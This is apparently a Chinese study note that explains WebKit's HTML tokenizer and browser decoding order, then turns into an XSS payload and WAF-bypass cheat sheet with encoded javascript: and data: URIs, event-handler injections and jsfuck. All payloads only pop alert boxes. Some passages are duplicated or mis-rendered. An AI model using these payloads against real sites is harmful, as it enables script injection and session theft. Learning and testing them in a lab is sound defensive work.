+<p>语言的解析一般分为词法分析（lexical analysis）和语法分析（Syntax analysis）两个阶段，WebKit中的html解析也不例外，本文主要讨论词法分析。</p>
+<p>词法分析的任务是对输入字节流进行逐字扫描，根据构词规则识别单词和符号，分词。</p>
+<p>在WebKit中，有两个类，同词法分析密切相关，它是HTMLToken和HTMLTokenizer类，可以简单将HTMLToken类理解为标记，HTMLTokenizer类理解为词法解析器。HTML词法解析的任务，就是将输入的字节流解析成一个个的标记（HTMLToken），然后由语法解析器进行下一步的分析。</p>
+<p>在XML/HTML的文档解析中，token这个词经常用到，我将其理解为一个有完整语义的单元（也就是分出来的“词”），一个元素通常对应于3个token，一个是元素的起始标签，一个是元素的结束标签，一个是元素的内容，这点同DOM树是不一样的，在DOM树上，起始标签和结束标签对应于一个元素节点，而元素内容对应另一个节点。</p>
+<p>除了起始标签(StartTag)、结束标签(EndTag)和元素内容（Character），HTML标签还有DOCTYPE（文档类型）,Comment（注释），Uninitialized（默认类型）和EndOfFile（文档结束）等类型，参见HTMLToken.h中的Type枚举。</p>
+<p><img alt="" src="http://hi.csdn.net/attachment/201011/9/0_1289298004iCWw.gif" /></p>
+<p>标记的组成：类型，在字节流中的偏移，数据（m_data,不同的类型具有不同的意义），文档类型，是否自封闭(对于开始和结束标签)，属性列表，当前属性。</p>
+<p>HTMLTokenizer就是要从字节流解析出一个个这样的结构体来，他的实现是基于状态机来做的。状态机模型在<code>&lt;http://www.w3.org/TR/html5/tokenization.html#tokenization&gt;</code>中已经明确定义，nextToken方法实现了该状态机。</p>
+<p>以一个简单的html文档来复盘状态机的几条路线。</p>
+<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;
+
+&lt;!--comment --&gt;
+
+&lt;html&gt;
+
+&lt;body&gt;
+
+&lt;a href=”w3c.org”&gt;w3c&lt;/a&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+
+<p>在HTML中，某些字符是预留的。例如在HTML中不能使用“&lt;”或“&gt;”，这是因为浏览器可能误认为它们是标签的开始或结束。如果希望正确地显示预留字符，就需要在HTML中使用对应的字符实体。一个HTML字符实体描述如下：</p>
+<table>
+<thead>
+<tr>
+<th>字符显示</th>
+<th>描述</th>
+<th>实体名称</th>
+<th>实体编号</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&lt;</td>
+<td>小于号</td>
+<td>&amp;lt</td>
+<td>&amp;#60；</td>
+</tr>
+</tbody>
+</table>
+<p>字符引用包括“字符值引用”和“字符实体引用”。在上述HTML例子中，'&lt;'对应的字符值引用为'&#60;'，对应的字符实体引用为‘&lt;’。字符实体引用也被叫做“实体引用”或“实体”。）</p>
+<p>不考虑类似<code>&lt;html&gt;</code>和<code>&lt;body&gt;</code>之间的回车换行（webkit里面有做特殊处理，也就是所谓的“authoring convenience”，m_skipLeadingNewLineForListing），从前面的描述中，我们可以确认，该文档有9个HTMLToken，分别是文档类型声明，注释，html的起始标签，body的起始标签，a的起始标签，a的元素内容，a的介绍标签，body的结束标签，html的结束标签。</p>
+<p>起始状态为DataState。</p>
+<p>1）DOCTYPE</p>
+<pre><code>DataState：&lt;!DOCTYPE，碰到’&lt;’，进入TagOpenState
+
+TagOpenState：&lt;!DOCTYPE, 碰到’!’，进入MarkupDeclarationOpenState状态
+
+MarkupDeclarationOpenState：&lt;!DOCTYPE,碰到’D’，匹配DOCTYPE和--字数都不够，保持现状
+
+MarkupDeclarationOpenState：&lt;!DOCTYPE,匹配doctype，进入DOCTYPEState状态(HTMLToken的type为DOCTYPE)
+
+DOCTYPEState: &lt;!DOCTYPE html PUBL，碰到空格，进入BeforeDOCTYPENameState状态
+
+BeforeDOCTYPENameState: &lt;!DOCTYPE html PUBL，碰到’h’，进入DOCTYPENameState
+
+DOCTYPENameState: &lt;!DOCTYPE html PUBL，碰到’t’,保持原状态，提取html作为文档类型
+
+DOCTYPENameState: &lt;!DOCTYPE html PUBL，碰到空格，进入AfterDOCTYPENameState状态。(HTMLToken的m_data为html)
+
+AfterDOCTYPENameState：&lt;!DOCTYPE html PUBLIC，碰到’P’，还未能匹配Public或者system，保持状态
+
+AfterDOCTYPENameState：&lt;!DOCTYPE html PUBLIC,匹配public，进入AfterDOCTYPEPublicKeywordState
+
+AfterDOCTYPEPublicKeywordState：&lt;!DOCTYPE html PUBLIC &quot;-/，碰到空格，进入BeforeDOCTYPEPublicIdentifierState
+
+BeforeDOCTYPEPublicIdentifierState：&lt;!DOCTYPE html PUBLIC &quot;-/，碰到’”’，进入DOCTYPEPublicIdentifierDoubleQuotedState
+
+DOCTYPEPublicIdentifierDoubleQuotedState：&lt;!DOCTYPE html PUBLIC &quot;-/，碰到’-‘，保持状态，提取m_publicIdentifier
+
+DOCTYPEPublicIdentifierDoubleQuotedState：&lt;!DOCTYPE html PUBLIC &quot;-/…nal//EN&quot;&gt;,碰到’”’,进入AfterDOCTYPEPublicIdentifierState状态。（HTMLToken的m_publicIdentifier确定）
+
+AfterDOCTYPEPublicIdentifierState：&lt;!DOCTYPE html PUBLIC &quot;-/…nal//EN&quot;&gt; ，碰到’&gt;’,进入DataState状态，完成文档类型的解析
+</code></pre>
+
+<p>2）COMMENT</p>
+<pre><code>DataState：&lt;!--comment --&gt;，碰到’&lt;’，进入TagOpenState
+
+TagOpenState：&lt;!--comment --&gt;, 碰到’!’，进入MarkupDeclarationOpenState状态
+
+MarkupDeclarationOpenState：&lt;!--comment --&gt;,碰到’-’，匹配DOCTYPE和--字数都不够，保持现状
+
+MarkupDeclarationOpenState：&lt;!--comment --&gt;,匹配--，进入CommentStartState状态(HTMLToken的type为COMMENT)
+
+CommentStartState: &lt;!--comment --&gt;,碰到’c’，进入CommentState
+
+CommentState：&lt;!--comment --&gt;，碰到’-‘，进入CommentEndDashState状态(HTMLToken的m_data为comment)
+
+CommentEndDashState: &lt;!--comment --&gt;,碰到’-‘，进入CommentEndState状态
+
+CommentEndState：&lt;!--comment --&gt;,碰到’&gt;‘，进入DataState状态，完成解析。
+</code></pre>
+
+<p>3）起始标签a</p>
+<pre><code>DataState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到’&lt;’,进入TagOpenState状态
+
+TagOpenState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到’a’,进入TagNameState状态（HTMLToken的type为StartTag）
+
+TagNameState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到空格，进入BeforeAttributeNameState状态（HTMLToken的m_data为a）
+
+BeforeAttributeNameState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到‘h’,进入AttributeNameState状态
+
+AttributeNameState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到‘=’，进入BeforeAttributeValueState状态（HTMLToken属性列表中加入一个属性，属性名为href)
+
+BeforeAttributeValueState: &lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到‘“’，进入AttributeValueDoubleQuotedState状态
+
+AttributeValueDoubleQuotedState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到‘w’，保持状态，提取属性值
+
+AttributeValueDoubleQuotedState：&lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到‘“’，进入AfterAttributeValueQuotedState(HTMLToken当前属性的值为w3c.org).
+
+AfterAttributeValueQuotedState: &lt;a href=[”w3c.org](http://www.w3c.org/)&quot;&gt;，碰到‘&gt;’，进入DataState，完成解析。
+
+在完成startTag的解析的时候，会在解析器中存储与之匹配的end标签（m_appropriateEndTagName），等到解析end标签的时候，会同它进行匹配（语法解析的时候）。
+
+html，body起始标签类似a起始标签，但没有属性解析
+</code></pre>
+
+<p>4） a元素</p>
+<pre><code>DataState：w3c&lt;/a&gt;，碰到’w’,维持原状态，提取元素内容(HTMLToken的type为character)。
+
+DataState：w3c&lt;/a&gt;，碰到’&lt;’,完成解析，不consume ’&lt;’。(HTMLToken的m_data为w3c)。
+</code></pre>
+
+<p>5）a结束标签</p>
+<pre><code>DataState：w3c&lt;/a&gt;，碰到’&lt;’,进入TagOpenState。
+
+TagOpenState：w3c&lt;/a&gt;，碰到’/’,进入到EndTagOpenState。（HTMLToken的type为endTag）。
+
+EndTagOpenState：w3c&lt;/a&gt;，碰到’a’,进入到TagNameState。
+
+TagNameState：w3c&lt;/a&gt;，碰到’&gt;’,进入到DataState，完成解析。
+
+</code></pre>
+
+<p>通过以上的复盘，一个标记的token过程清晰呈现在眼前，基本上就是实现<code>http://www.w3.org/TR/html5/tokenization.html</code>这一章的一个过程，html的规范是相当宽松的，所以词法解析要考虑到的问题很多，html5specfication在这方面为实现者做了绝大部分工作。另外，html的语法解析会影响词法解析，比如语法解析在解析到head里面title的起始标签后，会将htmltokenizer解析器的状态设置为RCDATAState。</p>
+<p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，浏览器处于Datastate状态时，只要遇到一个'&lt;'符号（后面没有跟'/'符号）就会进入“标签开始状态(Tagopenstate)”。然后转变到“标签名状态(Tagnamestate)”，“前属性名状态(beforeattributenamestate)”......最后进入“数据状态(Datastate)”并释放当前标签的token。当解析器处于“数据状态(Datastate)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p>
+<p>这里有三种情况可以容纳字符实体，“数据状态中的字符引用”，“RCDATA状态中的字符引用”和“属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&amp;#...”形式解码，对应的解码字符会被放入数据缓冲区中。例如，在问题4中，“&lt;”和“&gt;”字符被编码为“&#60;”和“&#62;”。当解析器解析完<code>“&lt;div&gt;”</code>并处于“数据状态”时，这两个字符将会被解析。当解析器遇到“&amp;”字符，它会知道这是“数据状态的字符引用”，因此会消耗一个字符引用（例如“&#60;”）并释放出对应字符的token。在这个例子中，对应字符指的是“&lt;”和“&gt;”。大家可能会想：这是不是意味着“&lt;”和“&gt;”的token将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”。</p>
+<p>在HTML中有五类元素：</p>
+<pre><code>1.空元素(Voidelements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等
+2.原始文本元素(Rawtextelements)，有&lt;script&gt;和&lt;style&gt;
+3.RCDATA元素(RCDATAelements)，有&lt;textarea&gt;和&lt;title&gt;
+4.外部元素(Foreignelements)，例如MathML命名空间或者SVG命名空间的元素
+5.基本元素(Normalelements)，即除了以上4种元素以外的元素
+</code></pre>
+
+<p>五类元素的区别如下：</p>
+<p>1.空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>
+<p>2.原始文本元素，可以容纳文本。</p>
+<p>3.RCDATA元素，可以容纳文本和字符引用。（&amp;#60）</p>
+<p>4.外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</p>
+<p>5.基本元素，可以容纳文本、字符引用、其他元素和注释</p>
+<p>2.原始文本元素(Rawtextelements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>3.RCDATA元素(RCDATAelements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>4.外部元素(Foreignelements)，例如MathML命名空间或者SVG命名空间的元素。</p>
+<p>5.基本元素(Normalelements)，即除了以上4种元素以外的元素</p>
+<p>HTML解析器的规则，其中有一种可以容纳字符引用的情况是“RCDATA状态中的字符引用”。这意味着在<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>标签中的字符引用会被HTML解析器解码。</p>
+<p>这里要再提醒一次,在解析这些字符引用的过程中不会进入“标签开始状态”。对RCDATA有个特殊的情况。在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。</p>
+<p>在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“/”和对应的标签名，解析器会转换回“RCDATA状态”。这意味着在RCDATA元素标签的内容中（例如<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>的内容中），唯一能够被解析器认做是标签的就是<code>“&lt;/textarea&gt;”</code>或者<code>“&lt;/title&gt;”</code>。这要看开始标签是哪一个。在<code>“&lt;textarea&gt;”</code>和<code>“&lt;title&gt;”</code>的内容中不会创建标签，就不会有脚本能够执行。</p>
+<h3 id="3"><strong>3）编码知识</strong></h3>
+<ul>
+<li>
+<p>浏览器解析规则</p>
+</li>
+<li>
+<ul>
+<li><strong>URL编码：</strong></li>
+</ul>
+<p>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)</p>
+<p><strong>HTML实体编码：</strong></p>
+<ul>
+<li>命名实体：以&amp;开头，分号结尾的，例如“&lt;”的编码是“&lt;”</li>
+<li>字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“&lt;”和“&lt;”</li>
+</ul>
+</li>
+</ul>
+<p><strong>JS编码：</strong>js提供了四种字符编码的策略</p>
+<pre><code>1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”
+2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”
+3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”
+4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）
+5、jsfuck编码
+</code></pre>
+
+<p><strong>CSS编码：</strong>用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”</p>
+<p>HTML解析器能识别在文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明的对这些编码进行解码</p>
+<p>浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。</p>
+<p>比如：<code>&lt;a href="javascript:window.open('http://www.baidu.com')"&gt;test&lt;/a&gt;</code></p>
+<p>这段代码，HTML解析器首先工作（注：此时，若href=”字符串”中的字符串存在字符引用，会对其解码）。然后URL解析器开始对href值进行URL解析。进行URL解析时，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。即，javascript:是不能进行任何js编码的。解析了javascript：之后，会由JS解析器进行解析。JS解析器针对一些编码，其只有在标志符名称里的编码字符才能够被正常的解析。解析完window.open以后，又会由URL解析器进行解析。想了解各解析器的特性，可参考这篇文章<a href="http://bobao.360.cn/learning/detail/292.html">深入理解浏览器解析机制和XSS向量编码</a></p>
+<p>JS解析器不会解析和解码字符引用，而针对JS的一些编码其会视情况而定。</p>
+<p>可以看到，该代码经过了HTML-&gt;URL-&gt;JS-&gt;URL 四重解析。由于不同的解析器能够分别对一些编码格式进行解析，所以我们可以通过生成特定格式的编码代码，令其在依次解码后能够正确执行，从而绕过WAF。</p>
+<p>如：</p>
+<pre><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;test&lt;/a&gt;
+</code></pre>
+
+<p>该代码能够正确执行。</p>
+<p>首先，经过HTML解析之后，代码会变成</p>
+<pre><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;test&lt;/a&gt;
+</code></pre>
+
+<p>此时，由于javascript已经生成，不违反URL解析规则。所以，URL解析正常。解析了javascript，最终进入JS解析器。注意，URL解析器还完成了URL解码工作。</p>
+<pre><code>&lt;a href=&quot;javascript:alert(2)&quot;&gt;test&lt;/a&gt;
+</code></pre>
+
+<p>所以，JS最终解析的代码时alert(2).成功执行。</p>
+<p>总结来说，各种编码在XSS中的利用非常灵活，我们需要在充分了解浏览器的解析原理合理构造合理编码顺序的代码，最终构造出Payload。</p>
+<h3 id="4xss"><strong>4）XSS分类介绍</strong></h3>
+<ul>
+<li>反射性XSS</li>
+</ul>
+<p>恶意代码通常存在于URL中需要用户去点击相应的链接才会触发，隐蔽性较差而且，而且可能会被浏览器的XSSFilter干掉</p>
+<p>流程：输入--输出</p>
+<ul>
+<li>存储型XSS</li>
+</ul>
+<p>恶意代码通常存在于数据库中用户浏览被植入payload的“正常页面”时即可触发，隐蔽性较强，成功率高，稳定性好。</p>
+<p>流程：输入--进入数据库--取出数据库--输出</p>
+<h2 id="payload">测试Payload</h2>
+<p>常规测试的Payload可以使用<code>https://xss.haozi.me/#/0x01</code>测试</p>
+<ul>
+<li>0x00</li>
+</ul>
+<p>输出位置可以使用标签</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>0x01
+闭合前面的标签，之后创建新的<code>&lt;script&gt;</code>标签</li>
+</ul>
+<pre><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>0x02
+在属性值内的情况，用"&gt;闭合前面的input标签，之后创建新的<code>&lt;script&gt;</code>标签</li>
+</ul>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>0x03
+利用事件属性，<code>&lt;img src=x onerror=alert&amp;#40;1&amp;#41;&gt;</code></li>
+</ul>
+<p>src报错，出发onerror事件。</p>
+<pre><code>&lt;img src=x onerror=alert&amp;#40;1&amp;#41;&gt;
+</code></pre>
+
+<ul>
+<li>0x04
+使用DATA URI Scheme和实体绕过</li>
+</ul>
+<pre><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;
+
+&lt;iframe srcdoc=&quot;&lt;script&gt;alert&amp;#x28;1&amp;#x29;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+
+<ul>
+<li>0x05
+注释符闭合绕过</li>
+</ul>
+<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>0x0   6
+换行符绕过，具体应该是%0A</li>
+</ul>
+<pre><code>type=image src=1 onerror
+=alert(1)
+</code></pre>
+
+<ul>
+<li>0x07
+DOM事件，换行绕过。</li>
+</ul>
+<pre><code>&lt;svg onload=alert(1) 
+</code></pre>
+
+<ul>
+<li>0x08
+匹配单标签截断绕过</li>
+</ul>
+<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>0x0D
+换行绕过+注释绕过</li>
+</ul>
+<pre><code>
+alert(1)
+--&gt;
+</code></pre>
+
+<ul>
+<li>0x0F</li>
+</ul>
+<pre><code>');alert('1
+</code></pre>
+
+<ul>
+<li>0x10
+实体绕过</li>
+</ul>
+<pre><code>123;alert(1)
+</code></pre>
+
+<ul>
+<li>0x11
+引号闭合</li>
+</ul>
+<pre><code>&quot;);alert(&quot;1
+</code></pre>
+
+<ul>
+<li>0x12
+标签截断</li>
+</ul>
+<pre><code>\&quot;);alert(1)//
+</code></pre>
+
+<h2 id="waf">WAF绕过</h2>
+<pre><code>  简单: &quot;'&lt;script javascript onload src&gt;&lt;a href&gt;&lt;/a&gt;#$%^ 
+  全面: '&quot;;!-=#$%^&amp;{()}&lt;script javascript data onload href src img input&gt;&lt;a href&gt;&lt;/a&gt;alert(String.fromCharCode(88,83,83));prompt(1);confirm(1)&lt;/script&gt;
+
+</code></pre>
+
+<p>观察输入输出情况，一些特殊字符是否被编码、标签是否被过滤、输出点在标签之间或标签之内。</p>
+<h3 id="xss_1">输出位置进行XSS</h3>
+<ul>
+<li>标签之间</li>
+</ul>
+<pre><code>    模型： &lt;div&gt;[xss]&lt;/div&gt; 
+    payload： &lt;script&gt;alert(1)&lt;/script&gt;或者&lt;img src=1 onerror=alert(1)&gt; 
+    这些标签有：
+    &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt; &lt;svg&gt; &lt;video&gt; &lt;audio&gt;
+
+    自带HtmlEncode（转义）功能的标签(RCDATA)，这是插入的javascript不会被执行，除非闭合掉它们。
+    &lt;textarea&gt;&lt;/textarea&gt; 
+    &lt;title&gt;&lt;/title&gt; 
+    &lt;iframe&gt;&lt;/iframe&gt; 
+    &lt;noscript&gt;&lt;/noscript&gt; 
+    &lt;noframes&gt;&lt;/noframes&gt; 
+    &lt;xmp&gt;&lt;/xmp&gt; 
+    &lt;plaintext&gt;&lt;/plaintext&gt; 
+    其他：&lt;math&gt;&lt;/math&gt;
+</code></pre>
+
+<ul>
+<li>
+<p>在JS标签内：</p>
+<p>在该位置，空格被过滤，可用/**/代替空格。输出在注释中，通过换行符%0a %0d使其逃逸出来。</p>
+</li>
+</ul>
+<p>1.不在字符串内。
+判断&lt;&gt;/是否被过滤。如果没有，那么直接插入就可以。</p>
+<pre><code>    &lt;script&gt;
+    [output]
+    &lt;/script&gt;
+
+    payload：
+
+    &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<p>2.在字符串中
+此时需要闭合字符串，并保证插入的JS代码符合语法规范。如：</p>
+<pre><code>    &lt;script&gt;
+    Var x=&quot;Input&quot;;
+    &lt;/script&gt;
+
+    payload:
+
+    input是输出点，我们首先要闭合双引号，才能保证XSS成功。如果我们无法闭合包括字符串的引号（引号被转义），就很难利用。
+</code></pre>
+
+<pre><code>除非存在两个输出点或宽字节，在引号被转义成"时有效。在网页为GBK编码时，存在宽字节问题。
+
+| 反斜线复仇记                                                 | 利用点     |
+| ------------------------------------------------------------ | ---------- |
+| `https://wizardforcel.gitbooks.io/xss-naxienian/content/4.html` | 两个输入点 |
+| 那些年我们一起学XSS【宽字节复仇记】                          |            |
+| `https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html` | 宽字节     |
+</code></pre>
+<ul>
+<li>输出在HTML属性内</li>
+</ul>
+<p>1.文本属性中</p>
+<pre><code>  例如：`&lt;input value="输出"&gt;` 、 `&lt;img onload="...[输出]..."&gt;` ，再比如 `&lt;body style="...[输出]..."&gt;`
+
+  - 无引号包裹，直接添加新的事件属性。
+  - 有引号包括。首先测试引号是否可用，可用则闭合属性之后添加新的事件属性。
+
+HTML的属性，如果被进行HTML实体编码(形如'&amp;#x27)，那么HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构造payload。当然，也可以闭合属性后，然后再执行脚本。
+</code></pre>
+<p>2.<code>src/href/action/xlink:href/autofocus/content/data</code>等属性直接使用伪协议绕过。</p>
+<pre><code>    javascript 伪协议： &lt;a href=javascript:alert(2)&gt;test&lt;/a&gt; 
+
+    data 协议执行 javascript： &lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;test&lt;/a&gt;(Chrome被拦截，Firefox可以) 
+
+    urlencode 版本： &lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;(测试未通过)
+
+    不使用 href 的另外一种组合来执行 
+    js： &lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;
+         &lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;
+         &lt;/a&gt;&lt;/svg&gt;（均可） 
+         或者： 
+      &lt;math&gt;
+          &lt;a xlink:href=javascript:alert(1)&gt;1&lt;/a&gt;
+          &lt;/math&gt;(Chrome不可，Firefox可以)
+</code></pre>
+
+<pre><code>如果不行，则测试添加事件进行触发。（首先还是需要闭合）如：
+</code></pre>
+<pre><code>&lt;a href=&quot;test.com&quot; onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;
+</code></pre>
+
+<p>3.on*事件</p>
+<p>插入合乎逻辑的JS代码即可。也可以使用伪协议。</p>
+<p>常见事件</p>
+<pre><code>onload 
+onclick
+onunload 
+onchange 
+onsubmit 
+onreset 
+onselect 
+onblur 
+onfocus 
+onabort 
+onkeydown 
+onkeypress 
+onkeyup 
+ondbclick 
+onmouseover 
+onmousemove 
+onmouseout 
+onmouseup 
+onforminput 
+onformchange 
+ondrag 
+ondrop
+</code></pre>
+
+<p>4.style属性内及css代码之中IE可执行，并且在IE6以上被防御，不适合其他浏览器，基本已死。</p>
+<pre><code>style=&quot;width:expression(js代码)&quot;
+background-image:url('javascript:alert(2)')
+</code></pre>
+
+<p>输出在meta标签</p>
+<pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;
+</code></pre>
+
+<h3 id="payload_1"><strong>具体标签的Payload</strong></h3>
+<p>1.a标签</p>
+<ul>
+<li>javascript伪协议：</li>
+</ul>
+<pre><code>&lt;a href=javascript:alert(2)&gt;
+</code></pre>
+
+<ul>
+<li>data协议执行javascript：</li>
+</ul>
+<pre><code>&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;
+</code></pre>
+
+<ul>
+<li>urlencode版本：</li>
+</ul>
+<pre><code>&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;
+</code></pre>
+
+<ul>
+<li>不使用href的另外一种组合来执行js：</li>
+</ul>
+<pre><code>&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt; 
+或者
+&lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;&lt;/math&gt;
+</code></pre>
+
+<p>2.script标签</p>
+<ul>
+<li>最简单的测试payload：</li>
+</ul>
+<pre><code>  &lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>jsfuck版本：</li>
+</ul>
+<pre><code>  http://www.jsfuck.com/
+
+  &lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt;
+</code></pre>
+
+<ul>
+<li>各种编码版本：</li>
+</ul>
+<pre><code>  &lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&gt;
+
+  &lt;script&gt;prompt(-[])&lt;/script&gt;//不只是alert。prompt和confirm也可以弹窗 
+
+  &lt;script&gt;alert(/3/)&lt;/script&gt;//可以用&quot;/&quot;来代替单引号和双引号 
+
+  &lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt; //我们还可以用char
+
+  &lt;script&gt;alert(/7/.source)&lt;/script&gt; // &quot;.source&quot;不会影响alert(7)的执行
+
+  &lt;script&gt;setTimeout('alert(1)',0)&lt;/script&gt; //如果输出是在setTimeout里，我们依然可以直接执行alert(1)
+</code></pre>
+
+<p>3.button标签</p>
+<ul>
+<li>event事件实现js调用：</li>
+</ul>
+<pre><code>  &lt;button/onclick=alert(1) &gt;M&lt;/button&gt;
+</code></pre>
+
+<ul>
+<li>html5的新姿势：</li>
+</ul>
+<p>需要交互的版本：</p>
+<pre><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M
+</code></pre>
+
+<p>不需要交互的版本：</p>
+<pre><code>&lt;button onfocus=alert(1) autofocus&gt;
+</code></pre>
+
+<p>4.p标签</p>
+<ul>
+<li>如果发现变量输出在p标签中，只要能跳出<code>""</code>就足够了：</li>
+</ul>
+<pre><code>  &lt;p/onmouseover=javascript:alert(1); &gt;M&lt;/p&gt;
+</code></pre>
+
+<p>5.img标签</p>
+<p>有些姿势是因为浏览器的不同而不能成功执行的。</p>
+<ul>
+<li>chrome下有效：</li>
+</ul>
+<pre><code>&lt;img src ?itworksonchrome?\/onerror = alert(1)&gt;  //只在chrome下有效
+
+&lt;img/src/onerror=alert(1)&gt;  //只在chrome下有效
+</code></pre>
+
+<ul>
+<li>其他：</li>
+</ul>
+<pre><code>&lt;img src=x onerror=alert(1)&gt; 
+
+&lt;img src=&quot;x:kcf&quot; onerror=&quot;alert(1)&quot;&gt;
+</code></pre>
+
+<p>6.body标签</p>
+<p>通过event事件来调用js</p>
+<pre><code>&lt;body onload=alert(1)&gt; 
+&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+</code></pre>
+
+<p>7.var标签</p>
